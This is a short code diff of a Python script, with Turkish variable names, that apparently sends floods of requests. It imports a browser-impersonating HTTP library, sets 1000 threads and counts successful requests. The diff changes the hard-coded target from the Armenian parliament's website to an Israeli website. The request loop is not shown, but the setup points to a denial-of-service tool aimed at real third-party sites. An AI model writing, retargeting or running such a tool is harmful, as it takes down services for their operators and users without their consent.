@@ -6,12 +6,11 @@ from datetime import datetime
 try:
     from curl_cffi import requests
 except ImportError:
-    # Bu mesaj, kütüphanenin eksik olduğunu net bir şekilde belirtir.
     print("[KRİTİK HATA] 'curl_cffi' kütüphanesi bulunamadı.")
     print("[ÇÖZÜM] Lütfen terminale 'pip install -U curl_cffi' komutunu yazarak kütüphaneyi kurun.")
     sys.exit(1)
 
-HEDEF_URL = 'https://www.parliament.am/' 
+HEDEF_URL = 'https://simania.co.il/' 
 THREAD_SAYISI = 1000 
 
 basarili_istekler = 0
